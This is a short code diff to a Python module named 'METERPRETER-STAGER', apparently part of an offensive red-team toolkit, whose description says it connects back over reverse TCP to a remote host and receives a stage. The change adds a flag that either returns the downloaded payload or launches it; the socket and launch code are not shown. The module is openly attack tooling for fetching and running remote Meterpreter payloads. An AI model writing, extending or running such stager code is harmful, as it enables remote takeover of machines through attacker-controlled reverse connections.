@@ -26,11 +26,12 @@ class module:
     
     Author          = 'raptor@0xdeadbeef.info, psycore8'
     Description     = 'Connect back (reverse_tcp) to remote host and receive a stage'
-    Version         = '1.2.1'
+    Version         = '1.2.2'
     DisplayName      = 'METERPRETER-STAGER'
     payload         = any
     payload_size    = int
     sock            = any
+    relay_output    = False
 
     def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
         self.remote_host = remote_host
@@ -121,6 +122,10 @@ class module:
         self.msg('pre.head')
         self.CreateSocket()
         self.ReceivePayload()
-        self.LaunchStage()
+        if self.relay_output:
+            print('\n')
+            return self.payload
+        else:
+            self.LaunchStage()
 
     
